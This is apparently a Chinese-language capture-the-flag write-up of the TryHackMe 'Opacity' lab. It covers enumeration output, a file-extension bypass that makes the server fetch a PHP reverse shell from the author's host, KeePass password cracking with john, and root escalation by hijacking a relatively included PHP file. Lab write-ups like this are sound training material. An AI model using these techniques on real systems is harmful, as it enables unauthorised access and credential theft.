---
layout: post
title:  "TryHackMe Challenge Writeup: Opacity"
date:   30 June 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇是關於TryHackMe上的Challenge: [Opacity](https://tryhackme.com/room/opacity) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度

### Step 1. Nmap

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:1f:c1:be:d3:be:87:1f:c0:be:f6:67:38:07:3a:36 (RSA)
|   256 e3:8f:86:91:60:6e:a5:75:37:8e:49:5c:1d:bb:3d:7c (ECDSA)
|_  256 bc:ad:49:b6:6d:83:19:64:c0:ab:e5:f2:1a:39:d3:d8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: IP-10-10-102-57, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   IP-10-10-102-57<00>  Flags: <unique><active>
|   IP-10-10-102-57<03>  Flags: <unique><active>
|   IP-10-10-102-57<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2025-06-27T07:13:06
|_  start_date: N/A
```

- 22/80/139/445，其中22不感興趣，80開起來是一個login頁面
- 139/445是SMB服務
- 所以目前來看，可以嘗試的點有兩個: (1)directory enumeration (2) SMB enumeration
- 路徑枚舉:

```bash
/css                  (Status: 301) [Size: 310] [--> http://10.10.102.57/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.102.57/cloud/]
/server-status        (Status: 403) [Size: 277]
```

### Step 2. enum4linux
- 嘗試 `enum4linux` 試試dump出SMB的相關資料，說不定會有用戶名可以做下一步攻擊
- 找到一個用戶 **nobody** : `S-1-5-21-2640187189-4081081146-185158976-501 IP-10-10-102-57\nobody (Local User) `
- 並且通過enum4linux結果得知密碼強度很低:

```bash
[+] Retieved partial password policy with rpcclient:                                                                               
Password Complexity: Disabled                                                                                                                                                      
Minimum Password Length: 5
```

- shared folders

```bash
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (ip-10-10-102-57 server (Samba, Ubuntu))
```

- 嘗試 `hydra` 爆破發現不行，因為使用的是SMBv2而Hydra只支持SMBv1
- 使用 `metasploit: auxiliary/scanner/smb/smb_login` 也是不行，顯示無法連接
- 嘗試手動使用 `smbclient` 連接也不行
- 暫時沒思路，回去80看看有沒有突破口

### Step 3. Website(80)
- 就一個登錄界面，首先想到可不可以SQLi，嘗試用Burp Suite保存POST請求並用sqlmap看看 => 結果不行
- 用網站架構分析工具先獲取基本信息

```bash
└─$ whatweb 10.10.102.57   
http://10.10.102.57 [302 Found] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.102.57], RedirectLocation[login.php]
http://10.10.102.57/login.php [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.102.57], PasswordField[Password], Title[Login]
```

- 沒什麼特別的，那麼回去看路徑枚舉中有一個 `/cloud` 看起來有點說法，嘗試看看
- 順利進到一個名為 **5 Minutes File Upload - Personal Cloud Storage** 的網站
- 底下有一個可以輸入 External URL 的輸入框，猜測會不會是伺服器會對這個 URL 發送請求並嘗試獲取文件之後存到自己的儲存空間中；用Burp Suite抓取後得到的請求:

```http
POST /cloud/ HTTP/1.1
Host: 10.10.102.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.102.57
Connection: keep-alive
Referer: http://10.10.102.57/cloud/
Cookie: PHPSESSID=fl3sjopa95a5i7o1eqpjse4se9
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2Flocalhost%2Fhome
```

- 不管怎樣，先測試功能，我馬上在自己的主機上開了一個python http server並生成一張圖片，在External URL中輸入 `http://10.4.9.189:8000/test.jpg` 之後會成功上傳並提供一個Image Link: `http://10.10.102.57/cloud/images/test.jpg`

- 並且發現有對文件名字做過濾，只接受 .jpg 格式，因此我們嘗試上傳一個php-reverse-shell的文件並通過修改文件名的方式來繞過檢驗機制: `http://10.4.9.189:8000/reverse.php#.jpg`
- 成功上傳後會獲得一個暫時性的圖片URL鏈接，馬上在瀏覽器中輸入這個鏈接觸發執行這個PHP文件
- 成功獲得reverse shell，用戶為www-data

### Step 4. 提權(user)
- 首先 `ls -l /home` 查看有哪些用戶并且 user flag 放在哪個用戶底下就代表我們要提權到哪個用戶
- 發現 `local.txt` 被放在用戶 **sysadmin** 下，并且 www-data 沒辦法直接讀
- 那麽首先先查有哪些文件 user=sysadmin 并且是不常見的:

```bash
$ find / -user sysadmin -perm -400 2>/dev/null | grep -v proc
/opt/dataset.kdbx
/home/sysadmin
/home/sysadmin/.sudo_as_admin_successful
/home/sysadmin/.ssh
/home/sysadmin/.bash_history
/home/sysadmin/scripts/lib
/home/sysadmin/local.txt
/home/sysadmin/.bashrc
/home/sysadmin/.cache
/home/sysadmin/.gnupg
/home/sysadmin/.bash_logout
/home/sysadmin/.profile
```

- 發現一個 `dataset.kdbx` 並且通過查詢得知是一個由 KeePass 密碼安全管理工具生成的一個文件，裏面應該有 sysadmin 的相關密碼
- 使用 `keepassxc` 嘗試讀出但發現需要密碼，那麽看看 john 或 hashcat 有沒有相應的工具可以爆破的
- 查到 `keepass2john` 可以將 .kdbx 轉爲適合john處理的格式並使用 john 破解: `keepass2john dataset.kdbx > dataset && john --wordlist=rockyou.txt dataset`

```bash
└─# john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt dataset
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:23 DONE (2025-06-29 21:06) 0.04269g/s 39.28p/s 39.28c/s 39.28C/s 741852963
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- 再次使用 `keepassxc` 打開，輸入密碼，得到 sysadmin 的密碼: C********************0
- ssh登入用戶sysadmin，成功登入獲得user flag

### Step 5. 提權(root)
- 首先找到 `/home/sysadmin` 下有一個 scripts folder 擁有者為 root 并且 sysadmin 可以看
- 進去看發現有一個 script.php 并且作用為每當上傳完一個檔案后會執行這個script.php備份

```bash
sysadmin@ip-10-10-135-178:~/scripts$ cat script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

- 并且發現一行 `require_once('lib/backup.inc.php')` 查過後發現會執行這麽一個php檔案，并且發現它的路徑使用相對路徑且這個文件夾我可以修改/添加檔案
- 那麽我先刪除掉原本的 backup.inc.php 並新增一個同名的檔案，且檔案内容執行 reverse shell
- 我期許的就是利用 script.php 是root權限并且每次備份時會執行一次 `require_once('lib/backup.inc.php')`，進一步執行 `backup.inc.php`，那麽我們只要在 `backup.inc.php` 中放入 reverse shell 就可以獲得root權限
- 最後上傳檔案並觸發執行 `backup.inc.php`，成功獲得 root shell



### 自我總結
總而言之 opacity 其實不難，主要是有一個rabbit hole: SMB讓我卡關很久，一直想要利用SMB漏洞結果忽略了網頁路徑枚舉出的結果

另外就是 Keepass 所使用的 .kdbx 也是第一次看到所以上網查了一下，也是進一步認識到說有這種密碼管理工具和副檔名，下一次碰到就不會忽略掉這麽個關鍵信息

## 學習資料
1. [TryHackMe Challenge: Opacity](https://tryhackme.com/room/opacity)
2. [Writeup 1: Opacity](https://github.com/0xDeco/CTF-Notes/tree/main/Opacity)
3. [Writeup 2: Opacity](https://www.youtube.com/watch?v=oTWxXR7QywY)

</div>
</body>
</html>
